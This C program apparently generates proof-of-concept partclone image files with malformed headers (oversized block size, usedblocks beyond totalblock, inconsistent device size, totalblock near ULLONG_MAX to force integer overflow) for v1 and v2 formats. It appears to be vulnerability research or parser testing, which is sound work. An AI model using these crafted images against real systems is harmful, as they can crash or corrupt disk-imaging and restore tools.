#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <limits.h>
#include "src/partclone.h"
#include "src/checksum.h"

#define pc_BITS_TO_BYTES(bits) (((bits) + 7) / 8)

// --- CRC32 Implementation (copied from src/checksum.c) ---
static uint32_t crc_tab32[256] = { 0 };

void init_crc32(uint32_t* seed) {
    if (crc_tab32[0] == 0) {
        uint32_t init_crc, init_p;
        uint32_t i, j;
        init_p = 0xEDB88320L;
        for (i = 0; i < 256; i++) {
            init_crc = i;
            for (j = 0; j < 8; j++) {
                if (init_crc & 0x00000001L)
                    init_crc = ( init_crc >> 1 ) ^ init_p;
                else
                    init_crc = init_crc >> 1;
            }
            crc_tab32[i] = init_crc;
        }
    }
    *seed = 0xFFFFFFFF;
}

uint32_t crc32(uint32_t seed, void* buffer, long size) {
    unsigned char * buf = (unsigned char *)buffer;
    const unsigned char * end = buf + size;
    uint32_t tmp, long_c, crc = seed;

    while (buf != end) {
        long_c = *(buf++);
        tmp = crc ^ long_c;
        crc = (crc >> 8) ^ crc_tab32[tmp & 0xff];
    };
    return crc;
}
// --- End of CRC32 Implementation ---


int main(int argc, char* argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <poc_type> <version>\n", argv[0]);
        fprintf(stderr, "  poc_type: invalid_block_size, invalid_usedblocks, inconsistent_device_size, small_file, large_totalblock, large_totalblock_overflow\n");
        fprintf(stderr, "  version: v1, v2\n");
        return 1;
    }

    char* poc_type = argv[1];
    char* version = argv[2];
    char filename[256];

    if (strcmp(version, "v2") == 0) {
        snprintf(filename, sizeof(filename), "poc_%s_v2.img", poc_type);
    } else if (strcmp(version, "v1") == 0) {
        snprintf(filename, sizeof(filename), "poc_%s_v1.img", poc_type);
    } else {
        fprintf(stderr, "Unknown version: %s\n", version);
        return 1;
    }

    if (strcmp(version, "v2") == 0) {
        image_desc_v2 header;
        memset(&header, 0, sizeof(header));
        memcpy(header.head.magic, IMAGE_MAGIC, IMAGE_MAGIC_SIZE);
        memcpy(header.head.version, IMAGE_VERSION_0002, IMAGE_VERSION_SIZE);
        header.head.endianess = ENDIAN_MAGIC;
        strcpy(header.head.ptc_version, "0.3.40");

        strcpy(header.fs_info.fs, "EXTFS");
        header.fs_info.block_size = 4096;
        header.fs_info.totalblock = 256000;
        header.fs_info.usedblocks = 128000;
        header.fs_info.device_size = header.fs_info.totalblock * header.fs_info.block_size;

        header.options.feature_size = sizeof(image_options_v2);
        header.options.image_version = 0x0002;
        header.options.cpu_bits = 64;
        header.options.checksum_mode = CSM_CRC32;
        header.options.checksum_size = CRC32_SIZE;
        header.options.blocks_per_checksum = 1;
        header.options.reseed_checksum = 1;
        header.options.bitmap_mode = BM_BIT;

        if (strcmp(poc_type, "invalid_block_size") == 0) {
            header.fs_info.block_size = 65537;
            header.fs_info.device_size = 0;
        } else if (strcmp(poc_type, "invalid_usedblocks") == 0) {
            header.fs_info.usedblocks = header.fs_info.totalblock + 1;
        } else if (strcmp(poc_type, "inconsistent_device_size") == 0) {
            header.fs_info.device_size = 12345;
        } else if (strcmp(poc_type, "small_file") == 0) {
            header.fs_info.totalblock = 1024 * 1024 * 8;
            header.fs_info.device_size = header.fs_info.totalblock * header.fs_info.block_size;
        } else if (strcmp(poc_type, "large_totalblock") == 0) {
            header.fs_info.totalblock = ULLONG_MAX;
        } else if (strcmp(poc_type, "large_totalblock_overflow") == 0) {
            header.fs_info.totalblock = ULLONG_MAX - 6 + 800;
        }

        init_crc32(&header.crc);
        header.crc = crc32(header.crc, &header, sizeof(header) - sizeof(header.crc));

        FILE* fp = fopen(filename, "wb");
        fwrite(&header, sizeof(header), 1, fp);
        fclose(fp);

    } else { // v1
        image_desc_v1 header;
        memset(&header, 0, sizeof(header));
        memcpy(header.head.magic, IMAGE_MAGIC, IMAGE_MAGIC_SIZE);
        memcpy(header.head.version, IMAGE_VERSION_0001, IMAGE_VERSION_SIZE);
        strcpy(header.head.fs, "EXTFS");

        header.fs_info.block_size = 4096;
        header.fs_info.totalblock = 256000;
        header.fs_info.usedblocks = 128000;
        header.fs_info.device_size = header.fs_info.totalblock * header.fs_info.block_size;

        if (strcmp(poc_type, "invalid_block_size") == 0) {
            header.fs_info.block_size = 65537;
             header.fs_info.device_size = 0;
        } else if (strcmp(poc_type, "invalid_usedblocks") == 0) {
            header.fs_info.usedblocks = header.fs_info.totalblock + 1;
        } else if (strcmp(poc_type, "inconsistent_device_size") == 0) {
            header.fs_info.device_size = 12345;
        } else if (strcmp(poc_type, "small_file") == 0) {
             header.fs_info.totalblock = 1024 * 1024 * 8;
             header.fs_info.device_size = header.fs_info.totalblock * header.fs_info.block_size;
        } else if (strcmp(poc_type, "large_totalblock") == 0) {
            header.fs_info.totalblock = ULLONG_MAX;
        } else if (strcmp(poc_type, "large_totalblock_overflow") == 0) {
            header.fs_info.totalblock = ULLONG_MAX - 6 + 800;
        }

        FILE* fp = fopen(filename, "wb");
        fwrite(&header, sizeof(header), 1, fp);
        fclose(fp);
    }

    printf("%s created successfully.\n", filename);

    return 0;
}